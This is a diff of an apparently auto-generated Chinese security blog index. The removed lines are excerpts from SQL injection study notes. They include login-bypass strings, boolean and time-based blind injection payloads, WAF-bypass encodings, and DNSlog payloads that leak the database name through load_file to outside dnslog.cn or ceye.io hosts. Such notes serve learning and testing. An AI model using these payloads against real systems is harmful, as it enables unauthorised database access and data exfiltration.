@@ -161,146 +161,7 @@
 <td>数据库名</td>
 <td></td>
 </tr>
-<tr>
-<td>limit 0,1</td>
-<td>返回数据的条数</td>
-<td>第一个参数为起始行，第二个参数为返回的行数</td>
-</tr>
-<tr>
-<td>substr(str,1,1)</td>
-<td>截取字符串</td>
-<td>第二个参数为起始位置，从1开始，第二个为截取的数量</td>
-</tr>
-<tr>
-<td>mid(str,1,1)</td>
-<td>同substr()</td>
-<td></td>
-</tr>
-<tr>
-<td>left(str,n)</td>
-<td>返回字符串的前n个字符</td>
-<td></td>
-</tr>
-<tr>
-<td>right(str,n)</td>
-<td>返回字符串的后n个字符</td>
-<td></td>
-</tr>
-<tr>
-<td>count(exp)</td>
-<td>结果数量</td>
-<td></td>
-</tr>
-<tr>
-<td>load_file()</td>
-<td>导入文件</td>
-<td></td>
-</tr>
-<tr>
-<td>hex()</td>
-<td>转换为16进制</td>
-<td></td>
-</tr>
-<tr>
-<td>concat(str1,str2…)</td>
-<td>合并多个字符串，没有分隔符</td>
-<td></td>
-</tr>
-<tr>
-<td>concat_ws(x,str1,str2..)</td>
-<td>同concat(),第一个参数为分隔符</td>
-<td></td>
-</tr>
-<tr>
-<td>group_concat()</td>
-<td>连接一个组的字符串，用组分割</td>
-<td></td>
-</tr>
-<tr>
-<td>ascii(str)</td>
-<td>返回字符串第一个字符的ascii码</td>
-<td></td>
-</tr>
-<tr>
-<td>ord(str)</td>
-<td>同ascii()</td>
-<td></td>
-</tr>
-<tr>
-<td>desc table_name</td>
-<td>展示表中的字段名和数据类型</td>
-<td></td>
-</tr>
-<tr>
-<td>strcmp(expr1,expr2)</td>
-<td>字符串比较，一样返回0，第一个小于第二个返回-1,第一个大于第二个返回1</td>
-<td></td>
-</tr>
-<tr>
-<td>RPAD(str,len,padstr)</td>
-<td>在str右方补齐len位的padstr，如果len小于str，返回len长度的str</td>
-<td></td>
-</tr>
-<tr>
-<td>LPAD(str,len,padstr)</td>
-<td>类似RPAD(),左补齐</td>
-<td></td>
-</tr>
-<tr>
-<td>INSERT(str,pos,len,newstr)</td>
-<td>在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。</td>
-<td></td>
-</tr>
-<tr>
-<td>LENGTH(str)</td>
-<td>返回字符串的长度</td>
-<td></td>
-</tr>
-<tr>
-<td>PI()</td>
-<td>返回π的具体数值</td>
-<td></td>
-</tr>
-<tr>
-<td>REGEXP “statement”</td>
-<td>正则匹配，返回布尔值</td>
-<td></td>
-</tr>
-<tr>
-<td>LIKE “statement”</td>
-<td>匹配数据，%代表任意内容，返回布尔值</td>
-<td></td>
-</tr>
-<tr>
-<td>RLIKE “statement”</td>
-<td>与regexp相同</td>
-<td></td>
-</tr>
-<tr>
-<td>LOWER(str)</td>
-<td>转换为小写，同LCASE(str)</td>
-<td></td>
-</tr>
-<tr>
-<td>UPPER(str)</td>
-<td>转换为大写,同UCASE(str)</td>
-<td></td>
-</tr>
-<tr>
-<td>NULLIF(expr1,expr2)</td>
-<td>如果相同，返回expr1，否则返回null</td>
-<td></td>
-</tr>
-<tr>
-<td>CHARSET(str)</td>
-<td>返回字符串使用的字符集</td>
-<td></td>
-</tr>
 </tbody></table>
-<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>|变量名|作用|<br>|—|—|—|<br>|@@datadir|数据库路径|<br>|versiomn_compile_os|操作系统版本|</p>
-<h2 id="常用fuzz"><a href="#常用fuzz" class="headerlink" title="常用fuzz"></a>常用fuzz</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p> ‘ or ‘’-‘<br>“ or “”-“<br>“ or true–<br>‘ or true–<br>admin’ –<br>admin’ #<br>admin’/*<br>admin’ or ‘1’=’1<br>admin’ or ‘1’=’1’–<br>admin’ or ‘1’=’1’#<br>admin’or 1=1 or ‘’=’<br>admin’ or 1=1<br>admin’ or 1=1–<br>admin’ or 1=1#<br>admin’ or 1=1/*</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>‘-‘<br>‘ ‘<br>‘&amp;’<br>‘^’<br>‘<em>‘<br>‘ or ‘’-‘<br>‘ or ‘’ ‘<br>‘ or ‘’&amp;’<br>‘ or ‘’^’<br>‘ or ‘’</em>‘<br>“-“<br>“ “<br>“&amp;”<br>“^”<br>“<em>“<br>“ or “”-“<br>“ or “” “<br>“ or “”&amp;”<br>“ or “”^”<br>“ or “”</em>“<br>or true–<br>“ or true–<br>‘ or true–<br>“) or true–<br>‘) or true–</p>
-<h2 id="常用数据库"><a href="#常用数据库" class="headerlink" title="常用数据库"></a>常用数据库</h2>
 	
 
 	</div>
@@ -335,146 +196,7 @@
 <td>数据库名</td>
 <td></td>
 </tr>
-<tr>
-<td>limit 0,1</td>
-<td>返回数据的条数</td>
-<td>第一个参数为起始行，第二个参数为返回的行数</td>
-</tr>
-<tr>
-<td>substr(str,1,1)</td>
-<td>截取字符串</td>
-<td>第二个参数为起始位置，从1开始，第二个为截取的数量</td>
-</tr>
-<tr>
-<td>mid(str,1,1)</td>
-<td>同substr()</td>
-<td></td>
-</tr>
-<tr>
-<td>left(str,n)</td>
-<td>返回字符串的前n个字符</td>
-<td></td>
-</tr>
-<tr>
-<td>right(str,n)</td>
-<td>返回字符串的后n个字符</td>
-<td></td>
-</tr>
-<tr>
-<td>count(exp)</td>
-<td>结果数量</td>
-<td></td>
-</tr>
-<tr>
-<td>load_file()</td>
-<td>导入文件</td>
-<td></td>
-</tr>
-<tr>
-<td>hex()</td>
-<td>转换为16进制</td>
-<td></td>
-</tr>
-<tr>
-<td>concat(str1,str2…)</td>
-<td>合并多个字符串，没有分隔符</td>
-<td></td>
-</tr>
-<tr>
-<td>concat_ws(x,str1,str2..)</td>
-<td>同concat(),第一个参数为分隔符</td>
-<td></td>
-</tr>
-<tr>
-<td>group_concat()</td>
-<td>连接一个组的字符串，用组分割</td>
-<td></td>
-</tr>
-<tr>
-<td>ascii(str)</td>
-<td>返回字符串第一个字符的ascii码</td>
-<td></td>
-</tr>
-<tr>
-<td>ord(str)</td>
-<td>同ascii()</td>
-<td></td>
-</tr>
-<tr>
-<td>desc table_name</td>
-<td>展示表中的字段名和数据类型</td>
-<td></td>
-</tr>
-<tr>
-<td>strcmp(expr1,expr2)</td>
-<td>字符串比较，一样返回0，第一个小于第二个返回-1,第一个大于第二个返回1</td>
-<td></td>
-</tr>
-<tr>
-<td>RPAD(str,len,padstr)</td>
-<td>在str右方补齐len位的padstr，如果len小于str，返回len长度的str</td>
-<td></td>
-</tr>
-<tr>
-<td>LPAD(str,len,padstr)</td>
-<td>类似RPAD(),左补齐</td>
-<td></td>
-</tr>
-<tr>
-<td>INSERT(str,pos,len,newstr)</td>
-<td>在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。</td>
-<td></td>
-</tr>
-<tr>
-<td>LENGTH(str)</td>
-<td>返回字符串的长度</td>
-<td></td>
-</tr>
-<tr>
-<td>PI()</td>
-<td>返回π的具体数值</td>
-<td></td>
-</tr>
-<tr>
-<td>REGEXP “statement”</td>
-<td>正则匹配，返回布尔值</td>
-<td></td>
-</tr>
-<tr>
-<td>LIKE “statement”</td>
-<td>匹配数据，%代表任意内容，返回布尔值</td>
-<td></td>
-</tr>
-<tr>
-<td>RLIKE “statement”</td>
-<td>与regexp相同</td>
-<td></td>
-</tr>
-<tr>
-<td>LOWER(str)</td>
-<td>转换为小写，同LCASE(str)</td>
-<td></td>
-</tr>
-<tr>
-<td>UPPER(str)</td>
-<td>转换为大写,同UCASE(str)</td>
-<td></td>
-</tr>
-<tr>
-<td>NULLIF(expr1,expr2)</td>
-<td>如果相同，返回expr1，否则返回null</td>
-<td></td>
-</tr>
-<tr>
-<td>CHARSET(str)</td>
-<td>返回字符串使用的字符集</td>
-<td></td>
-</tr>
 </tbody></table>
-<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>|变量名|作用|<br>|—|—|—|<br>|@@datadir|数据库路径|<br>|versiomn_compile_os|操作系统版本|</p>
-<h2 id="常用fuzz"><a href="#常用fuzz" class="headerlink" title="常用fuzz"></a>常用fuzz</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p> ‘ or ‘’-‘<br>“ or “”-“<br>“ or true–<br>‘ or true–<br>admin’ –<br>admin’ #<br>admin’/*<br>admin’ or ‘1’=’1<br>admin’ or ‘1’=’1’–<br>admin’ or ‘1’=’1’#<br>admin’or 1=1 or ‘’=’<br>admin’ or 1=1<br>admin’ or 1=1–<br>admin’ or 1=1#<br>admin’ or 1=1/*</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>‘-‘<br>‘ ‘<br>‘&amp;’<br>‘^’<br>‘<em>‘<br>‘ or ‘’-‘<br>‘ or ‘’ ‘<br>‘ or ‘’&amp;’<br>‘ or ‘’^’<br>‘ or ‘’</em>‘<br>“-“<br>“ “<br>“&amp;”<br>“^”<br>“<em>“<br>“ or “”-“<br>“ or “” “<br>“ or “”&amp;”<br>“ or “”^”<br>“ or “”</em>“<br>or true–<br>“ or true–<br>‘ or true–<br>“) or true–<br>‘) or true–</p>
-<h2 id="常用数据库"><a href="#常用数据库" class="headerlink" title="常用数据库"></a>常用数据库</h2>
 	
 	</div>
   <a type="button" href="/2020/12/23/sql注入常用知识/#more" class="btn btn-default more">阅读此文</a>
@@ -506,68 +228,6 @@
 <li><code>Select col form table union select database();</code></li>
 </ul>
 <p>如果前面的值为空，只返回后面的结果。<br>如若查询结果只能显示一条，可以用limit 0,1 或select group_concat(col)进行拼接</p>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
-<li>返回true或false</li>
-</ul>
-<p><code>1&#39;%20and%20ascii(substr((select%20database()),1,1))&gt;115--+</code></p>
-<p>通过ascii字符截取判断</p>
-<ul>
-<li><p><code>select * from users order by rand(True)</code></p>
-<p> <code>select * from users order by rand(False)</code></p>
-</li>
-</ul>
-<p>返回的结果不同，利用rand(database()=’users’).</p>
-<ul>
-<li><p>时间盲注</p>
-<ul>
-<li><p>利用sleep()</p>
-<pre><code>id=&#39; or if(ascii(substr(database(),1,1))&gt;114,sleep(3),0)%23
-
-if(exp,sleep(3),0)，根据返回的时间来判断exp中是否为真；</code></pre>
-</li>
-<li><p>利用大量运算模拟sleep()</p>
-<pre><code>id=&#39; or if(ascii(substr(database(),1,1))&gt;114,benchmark(10000000,sha(1)),0)%23</code></pre>
-</li>
-<li><p>通过笛卡尔积</p>
-<pre><code>select balabala from table1 where &#39;1&#39;=&#39;2&#39; or if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)</code></pre>
-</li>
-<li><p>rlike+rpad</p>
-<pre><code>rpad(1,349525,a)是指用a填充第一位的字符串以达到第二位的长度
-
-select * from table1 where 1=1 and if(mid(user(),1,1)=&#39;r&#39;,concat(rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd&#39;,1);</code></pre>
-</li>
-<li><p>DNSlog无回显盲注</p>
-<pre><code>需要windows平台
-
-在mysql中load_file会带dns查询请求
-
-查看变量确定权限
-
-`show variables like &#39;%secure%&#39;`
-
-   1、当secure_file_priv为空，就可以读取磁盘的目录。
-
-   2、当secure_file_priv为G:\，就可以读取G盘的文件。
-
-   3、当secure_file_priv为null，load_file就不能加载文件。
-
-需要secure_file_priv=&quot;&quot;
-
-5.5.34版本后默认为null，可以在my.ini中修改
-
-unc共享路径  `\\\\xq17.com\tet，\\\\转义后为\\`
-
-dnslog平台：http://dnslog.cn/
-
-poc :`&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\\abc&#39;))),1,0)--+`
-
-poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dnslog.cn\\abc&#39;));`
-
-注:域名后必须加\\\abc</code></pre>
-</li>
-</ul>
-</li>
-</ul>
 	
 
 	</div>
@@ -583,68 +243,6 @@ poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dn
 <li><code>Select col form table union select database();</code></li>
 </ul>
 <p>如果前面的值为空，只返回后面的结果。<br>如若查询结果只能显示一条，可以用limit 0,1 或select group_concat(col)进行拼接</p>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
-<li>返回true或false</li>
-</ul>
-<p><code>1&#39;%20and%20ascii(substr((select%20database()),1,1))&gt;115--+</code></p>
-<p>通过ascii字符截取判断</p>
-<ul>
-<li><p><code>select * from users order by rand(True)</code></p>
-<p> <code>select * from users order by rand(False)</code></p>
-</li>
-</ul>
-<p>返回的结果不同，利用rand(database()=’users’).</p>
-<ul>
-<li><p>时间盲注</p>
-<ul>
-<li><p>利用sleep()</p>
-<pre><code>id=&#39; or if(ascii(substr(database(),1,1))&gt;114,sleep(3),0)%23
-
-if(exp,sleep(3),0)，根据返回的时间来判断exp中是否为真；</code></pre>
-</li>
-<li><p>利用大量运算模拟sleep()</p>
-<pre><code>id=&#39; or if(ascii(substr(database(),1,1))&gt;114,benchmark(10000000,sha(1)),0)%23</code></pre>
-</li>
-<li><p>通过笛卡尔积</p>
-<pre><code>select balabala from table1 where &#39;1&#39;=&#39;2&#39; or if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)</code></pre>
-</li>
-<li><p>rlike+rpad</p>
-<pre><code>rpad(1,349525,a)是指用a填充第一位的字符串以达到第二位的长度
-
-select * from table1 where 1=1 and if(mid(user(),1,1)=&#39;r&#39;,concat(rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd&#39;,1);</code></pre>
-</li>
-<li><p>DNSlog无回显盲注</p>
-<pre><code>需要windows平台
-
-在mysql中load_file会带dns查询请求
-
-查看变量确定权限
-
-`show variables like &#39;%secure%&#39;`
-
-   1、当secure_file_priv为空，就可以读取磁盘的目录。
-
-   2、当secure_file_priv为G:\，就可以读取G盘的文件。
-
-   3、当secure_file_priv为null，load_file就不能加载文件。
-
-需要secure_file_priv=&quot;&quot;
-
-5.5.34版本后默认为null，可以在my.ini中修改
-
-unc共享路径  `\\\\xq17.com\tet，\\\\转义后为\\`
-
-dnslog平台：http://dnslog.cn/
-
-poc :`&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\\abc&#39;))),1,0)--+`
-
-poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dnslog.cn\\abc&#39;));`
-
-注:域名后必须加\\\abc</code></pre>
-</li>
-</ul>
-</li>
-</ul>
 	
 	</div>
   <a type="button" href="/2020/12/23/sql注入手法/#more" class="btn btn-default more">阅读此文</a>
@@ -678,47 +276,6 @@ poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dn
 <li><p>url编码</p>
 </li>
 <li><p>html编码</p>
-</li>
-<li><p>16进制 0x7573657273为users的16进制</p>
-<pre><code>   可以对单个字符进行16进制编码，也可对整个字符进行16进制编码</code></pre>
-</li>
-<li><p>unicode编码 </p>
-<pre><code>    单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
-
-     空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
-
-     左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
-
-   右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></pre>
-</li>
-<li><p>使用两种不同编码的字符进行比较，结果可能为 True 也可能为 False</p>
-</li>
-</ul>
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul>
-<li>// – – + – - # /**/ ;%00</li>
-<li>内联注释 /**/ 可以绕过空格过滤</li>
-<li><code>/*!UNION*/</code>在mysql可以执行</li>
-<li><code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code><h2 id="关键字替换为空格时"><a href="#关键字替换为空格时" class="headerlink" title="关键字替换为空格时"></a>关键字替换为空格时</h2></li>
-</ul>
-<p>union =&gt; ununionion</p>
-<h2 id="相同功能替换"><a href="#相同功能替换" class="headerlink" title="相同功能替换"></a>相同功能替换</h2><ul>
-<li>函数替换<ul>
-<li>substring / mid / sub</li>
-<li>ascii / hex / bin</li>
-<li>benchmark / sleep</li>
-</ul>
-</li>
-<li>变量替换<ul>
-<li>user() / @@user</li>
-</ul>
-</li>
-<li>符号和关键字<ul>
-<li>and / &amp;</li>
-<li>or / |</li>
-</ul>
-</li>
-</ul>
-<h2 id="HTTP参数"><a href="#HTTP参数" class="headerlink" title="HTTP参数"></a>HTTP参数</h2><h3 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h3><p>id=1&amp;id=2&amp;id=3 根据容器不同会有不同的结果</p>
 	
 
 	</div>
@@ -736,47 +293,6 @@ poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dn
 <li><p>url编码</p>
 </li>
 <li><p>html编码</p>
-</li>
-<li><p>16进制 0x7573657273为users的16进制</p>
-<pre><code>   可以对单个字符进行16进制编码，也可对整个字符进行16进制编码</code></pre>
-</li>
-<li><p>unicode编码 </p>
-<pre><code>    单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
-
-     空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
-
-     左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
-
-   右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></pre>
-</li>
-<li><p>使用两种不同编码的字符进行比较，结果可能为 True 也可能为 False</p>
-</li>
-</ul>
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul>
-<li>// – – + – - # /**/ ;%00</li>
-<li>内联注释 /**/ 可以绕过空格过滤</li>
-<li><code>/*!UNION*/</code>在mysql可以执行</li>
-<li><code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code><h2 id="关键字替换为空格时"><a href="#关键字替换为空格时" class="headerlink" title="关键字替换为空格时"></a>关键字替换为空格时</h2></li>
-</ul>
-<p>union =&gt; ununionion</p>
-<h2 id="相同功能替换"><a href="#相同功能替换" class="headerlink" title="相同功能替换"></a>相同功能替换</h2><ul>
-<li>函数替换<ul>
-<li>substring / mid / sub</li>
-<li>ascii / hex / bin</li>
-<li>benchmark / sleep</li>
-</ul>
-</li>
-<li>变量替换<ul>
-<li>user() / @@user</li>
-</ul>
-</li>
-<li>符号和关键字<ul>
-<li>and / &amp;</li>
-<li>or / |</li>
-</ul>
-</li>
-</ul>
-<h2 id="HTTP参数"><a href="#HTTP参数" class="headerlink" title="HTTP参数"></a>HTTP参数</h2><h3 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h3><p>id=1&amp;id=2&amp;id=3 根据容器不同会有不同的结果</p>
 	
 	</div>
   <a type="button" href="/2020/12/23/sql注入bypass/#more" class="btn btn-default more">阅读此文</a>
@@ -831,9 +347,9 @@ poc :`select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.f9bbk4.dn
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/sql注入/">sql注入<span>2</span></a></li>
-		
 			<li><a href="/tags/渗透/">渗透<span>3</span></a></li>
+		
+			<li><a href="/tags/sql注入/">sql注入<span>2</span></a></li>
 		
 			<li><a href="/tags/web/">web<span>3</span></a></li>
 		
